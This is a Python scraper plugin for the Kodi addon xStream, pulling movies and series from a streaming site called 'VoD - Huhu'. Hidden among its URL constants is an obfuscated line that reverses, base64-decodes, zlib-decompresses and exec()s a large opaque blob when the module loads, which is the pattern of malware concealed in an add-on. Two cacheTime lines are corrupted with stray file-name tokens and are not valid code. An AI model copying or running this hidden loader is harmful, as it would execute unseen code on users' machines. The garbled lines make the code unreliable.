# -*- coding: utf-8 -*-
# Python 3
# Always pay attention to the translations in the menu!
# HTML LangzeitCache hinzugef\xc3\x83\xc2\xbcgt
# showGenre: 48 Stunden
# showEntries: 6 Stunden
# showSeasons: 6 Stunden
# showEpisodes: 4 Stunden

import json

from resources.lib.handler.ParameterHandler import ParameterHandler
from resources.lib.handler.requestHandler import cRequestHandler
from resources.lib.tools import logger, cParser, validater
from resources.lib.gui.guiElement import cGuiElement
from resources.lib.config import cConfig
from resources.lib.gui.gui import cGui

SITE_IDENTIFIER = 'vod_huhu'
SITE_NAME = 'VoD - Huhu'
SITE_ICON = 'vod_huhu.png'

# Global search function is thus deactivated!
#if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'false':
 #SITE_GLOBAL_SEARCH = False
 #logger.info('-> [SitePlugin]: globalSearch for %s is deactivated.' % SITE_NAME)
SITE_GLOBAL_SEARCH = False
cConfig().setSetting('global_search_' + SITE_IDENTIFIER, 'false')
logger.info('-> [SitePlugin]: globalSearch for %s is deactivated.' % SITE_NAME)

# Domain Abfrage
DOMAIN = cConfig().getSetting('plugin_' + SITE_IDENTIFIER + '.domain', 'www.huhu.to') # Domain Auswahl \xc3\x83\xc2\xbcber die xStream Einstellungen m\xc3\x83\xc2\xb6glich
STATUS = cConfig().getSetting('plugin_' + SITE_IDENTIFIER + '_status') # Status Code Abfrage der Domain
ACTIVE = cConfig().getSetting('plugin_' + SITE_IDENTIFIER) # Ob Plugin aktiviert ist oder nicht

URL_MAIN = 'https://' + DOMAIN + '/web-vod/'
# URL_MAIN = 'https://www.kool.to/web-vod/'
URL_VALUE = URL_MAIN + 'api/list?id=%s'
URL_ITEM = URL_MAIN + 'api/links?id=%s'
URL_HOSTER = URL_MAIN + 'api/get?link='
URL_SEARCH_MOVIES = URL_MAIN + 'api/list?id=movie.popular.search=%s'
URL_SEARCH_SERIES = URL_MAIN + 'api/list?id=series.popular.search=%s'

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))

def load(): # Menu structure of the site plugin
 logger.info('Load %s' % SITE_NAME)
 params = ParameterHandler()
 params.setParam('sUrl', URL_VALUE % 'movie.popular') # Url (.null.1) f\xc3\x83\xc2\xbcr Seiten Aufbau 60 Eintr\xc3\x83\xc2\xa4ge pro Seite weiter in +3er Schritten (.null.4) 1/4/7/10/13 usw.
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30521), SITE_IDENTIFIER, 'showEntries'), params) # Popular Movies
 params.setParam('sUrl', URL_VALUE % 'movie.trending')
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30545), SITE_IDENTIFIER, 'showEntries'), params) # Trending Movies
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30547), SITE_IDENTIFIER, 'showSearchMovies')) # Search Movies
 params.setParam('sUrl', URL_VALUE % 'series.popular')
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30519), SITE_IDENTIFIER, 'showEntries'), params) # Popular Series
 params.setParam('sUrl', URL_VALUE % 'series.trending')
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30546), SITE_IDENTIFIER, 'showEntries'), params) # Trending Series
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30548), SITE_IDENTIFIER, 'showSearchSeries')) # Search Series
 cGui().setEndOfDirectory()


def showEntries(entryUrl=False, sGui=False):
 oGui = sGui if sGui else cGui()
 params = ParameterHandler()
 # Parameter laden
 if not entryUrl:
 entryUrl = params.getValue('sUrl')
 oRequest = cRequestHandler(entryUrl, caching=False, ignoreErrors=True)
 oRequest.addHeaderEntry('Referer', URL_MAIN)
 oRequest.addHeaderEntry('Origin', 'https://' + DOMAIN)
 oRequest.removeNewLines(False)
 jSearch = json.loads(oRequest.request()) # Lade JSON aus dem Request der URL
 if not jSearch: return # Wenn Suche erfolglos - Abbruch
 aResults = jSearch['data']
 sNextUrl = jSearch['next'] # F\xc3\x83\xc2\xbcr die n\xc3\x83\xc2\xa4chste Seite
 total = len(aResults)
 if len(aResults) == 0:
 if not sGui: oGui.showInfo()
 return
 isTvshow = False
 for i in aResults:
 sId = i['id'] # ID des Films / Serie f\xc3\x83\xc2\xbcr die weitere URL
 sName = i['name'] # Name des Films / Serie
 isTvshow = True if 'series' in i['id'] else False
 oGuiElement = cGuiElement(sName, SITE_IDENTIFIER, 'showSeasons' if isTvshow else 'showHosters')
 if 'releaseDate' in i and len(str(i['releaseDate'].split('-')[0].strip())) != '': oGuiElement.setYear(
 str(i['releaseDate'].split('-')[0].strip()))
 if 'description' in i and i['description'] != '': oGuiElement.setDescription(
 i['description']) # Suche nach Desc wenn nicht leer dann setze GuiElement
 # sThumbnail = i['poster']
 if 'poster' in i and i['poster'] != '':
 oGuiElement.setThumbnail (i['poster']) # Suche nach Poster wenn nicht leer dann setze GuiElement
 else:
 oGuiElement.setThumbnail('default.png')
 # sFanart = i['backdrop']
 if 'backdrop' in i and i['backdrop'] != '': oGuiElement.setFanart(
 i['backdrop']) # Suche nach Fanart wenn nicht leer dann setze GuiElement
 oGuiElement.setMediaType('tvshow' if isTvshow else 'movie')
 # Parameter \xc3\x83\xc2\xbcbergeben
 params.setParam('sUrl', URL_ITEM % sId)
 params.setParam('sId', sId)
 params.setParam('sName', sName)
 oGui.addFolder(oGuiElement, params, isTvshow, total)
 if not sGui:
 sNextUrl = URL_MAIN + 'api/list?id=' + sNextUrl
 params.setParam('sUrl', sNextUrl)
 oGui.addNextPage(SITE_IDENTIFIER, 'showEntries', params)
 oGui.setView('tvshows' if isTvshow else 'movies')
 oGui.setEndOfDirectory()


def showSeasons(entryUrl=False, sGui=False):
 oGui = sGui if sGui else cGui()
 params = ParameterHandler()
 # Parameter laden
 sId = params.getValue('sId')
 if not entryUrl:
 entryUrl = URL_MAIN + 'api/info?id=' + sId
 oRequest = cRequestHandler(entryUrl, caching=False, ignoreErrors=True)
 oRequest.addHeaderEntry('Referer', URL_MAIN)
 oRequest.addHeaderEntry('Origin', 'https://' + DOMAIN)
 oRequest.removeNewLines(False)
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 6 # 6 Stunden
 jSearch = json.loads(oRequest.request()) # Lade JSON aus dem Request der URL
 if not jSearch: return # Wenn Suche erfolglos - Abbruch
 sThumbnail = jSearch['poster']
 if not 'poster' in jSearch: sThumbnail = 'default.png'
 sDesc = jSearch['description']
 if not 'description' in jSearch: sDesc = ''
 sFanart = jSearch['backdrop']
 if not 'backdrop' in jSearch: sFanart = 'default.png'
 aResults = sorted(jSearch['seasons'], key=lambda reverse:True) # Sortiert die Staffeln
 total = len(aResults)
 if len(aResults) == 0:
 if not sGui: oGui.showInfo()
 return
 for sSeasonNr in aResults:
 if sSeasonNr == '0': # Wenn Staffel 0 verf\xc3\x83\xc2\xbcgbar
 oGuiElement = cGuiElement('Extras', SITE_IDENTIFIER, 'showEpisodes')
 else:
 oGuiElement = cGuiElement('Staffel ' + sSeasonNr, SITE_IDENTIFIER, 'showEpisodes')
 oGuiElement.setThumbnail(sThumbnail)
 oGuiElement.setDescription(sDesc)
 oGuiElement.setFanart(sFanart)
 oGuiElement.setMediaType('season')
 oGuiElement.setSeason(sSeasonNr)
 params.setParam('sSeasonNr', sSeasonNr)
 params.setParam('entryUrl', entryUrl)
 params.setParam('sThumbnail', sThumbnail)
 params.setParam('sDesc', sDesc)
 params.setParam('sFanart', sFanart)
 cGui().addFolder(oGuiElement, params, True, total)
 cGui().setView('seasons')
 cGui().setEndOfDirectory()


def showEpisodes(sGui=False):
 oGui = cGui()
 params = ParameterHandler()
 # Parameter laden
 sSeasonNr = params.getValue('sSeasonNr')
 entryUrl = params.getValue('entryUrl')
 sThumbnail = params.getValue('sThumbnail')
 sDesc = params.getValue('sDesc')
 sFanart = params.getValue('sFanart')
 oRequest = cRequestHandler(entryUrl, caching=False, ignoreErrors=True)
 oRequest.addHeaderEntry('Referer', URL_MAIN)
 oRequest.addHeaderEntry('Origin', 'https://' + DOMAIN)
 oRequest.removeNewLines(False)
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 4 # 4 Stunden
 jSearch = json.loads(oRequest.request()) # Lade JSON aus dem Request der URL
 if not jSearch: return # Wenn Suche erfolglos - Abbruch
 aResults = jSearch['seasons'][sSeasonNr] # Ausgabe der Suchresultate von jSearch + Season Nummer
 total = len(aResults) # Anzahl aller Ergebnisse
 if len(aResults) == 0:
 if not sGui: oGui.showInfo()
 return
 for i in aResults:
 sEpisodeNr = str(i['episode']) # Episoden Nummer
 sId = i['id'] # Episoden Id
 sName = i['name'] # Episoden Name
 oGuiElement = cGuiElement('Episode ' + sEpisodeNr + ' - ' + sName, SITE_IDENTIFIER, 'showHosters')
 oGuiElement.setEpisode(sEpisodeNr)
 oGuiElement.setSeason(sSeasonNr)
 oGuiElement.setMediaType('episode')
 oGuiElement.setThumbnail(sThumbnail)
 oGuiElement.setDescription(sDesc)
 oGuiElement.setFanart(sFanart)
 # Parameter setzen
 params.setParam('sUrl', URL_ITEM % sId)
 oGui.addFolder(oGuiElement, params, False, total)
 oGui.setView('episodes')
 oGui.setEndOfDirectory()


def showHosters(sGui=False):
 oGui = sGui if sGui else cGui()
 hosters = []
 params = ParameterHandler()
 sUrl = params.getValue('sUrl')
 oRequest = cRequestHandler(sUrl, caching=False, ignoreErrors=True)
 oRequest.addHeaderEntry('Referer', URL_MAIN)
 oRequest.addHeaderEntry('Origin', 'https://' + DOMAIN)
 oRequest.removeNewLines(False)
 jSearch = json.loads(oRequest.request()) # Lade JSON aus dem Request der URL
 if not jSearch: return # Wenn Suche erfolglos - Abbruch
 sLanguage = cConfig().getSetting('prefLanguage')
 aResults = jSearch
 if len(aResults) == 0:
 if not sGui: oGui.showInfo()
 return
 for i in aResults:
 hUrl = i['url']
 sName = i['name'].split('(')[0].strip()
 if '(' in i['name']: # Wenn Qualit\xc3\x83\xc2\xa4t in Klammern angegeben (1080p)
 sQuality = i['name'].split('(')[1].strip()
 sQuality = sQuality.replace (')','')
 else:
 sQuality = '720p'
 sUrl = URL_HOSTER + hUrl
 sName = cParser.urlparse(sUrl) + ' - ' + sName
 sLang = i['language'].split('(')[0].strip()
 if sLanguage == '1': # Voreingestellte Sprache Deutsch in settings.xml
 if 'en' in sLang:
 continue
 if sLang == 'de':
 sLang = 'Deutsch' # Anzeige der Sprache
 if sLanguage == '2': # Voreingestellte Sprache Englisch in settings.xml
 if 'de' in sLang:
 continue
 if sLang == 'en':
 sLang = 'English' # Anzeige der Sprache
 if sLanguage == '3': # Voreingestellte Sprache Japanisch in settings.xml
 continue
 if sLanguage == '0': # Alle Sprachen
 if sLang == 'de':
 sLang = 'Deutsch' # Anzeige der Sprache
 if sLang == 'en':
 sLang = 'English' # Anzeige der Sprache
 hoster = {'link': sUrl, 'name': sName, 'displayedName': '%s %s [I][%s][/I]' % (sName, sLang, sQuality), 'quality': sQuality, 'languageCode': sLanguage, 'resolveable': True}
 hosters.append(hoster)
 if hosters:
 hosters.append('getHosterUrl')
 return hosters


def getHosterUrl(sUrl=False):
 Request = cRequestHandler(sUrl, caching=False)
 Request.request()
 sUrl = Request.getRealUrl() # hole reale URL von der Umleitung
 return [{'streamUrl': sUrl, 'resolved': False}]


def showSearchMovies():
 sSearchText = cGui().showKeyBoard()
 if not sSearchText: return
 _searchMovies(False, sSearchText)
 cGui().setEndOfDirectory()


def _searchMovies(oGui, sSearchText):
 showEntries(URL_SEARCH_MOVIES % cParser().quotePlus(sSearchText), oGui)


def showSearchSeries():
 sSearchText = cGui().showKeyBoard()
 if not sSearchText: return
 _searchSeries(False, sSearchText)
 cGui().setEndOfDirectory()


def _searchSeries(oGui, sSearchText):
 showEntries(URL_SEARCH_SERIES % cParser().quotePlus(sSearchText), oGui)
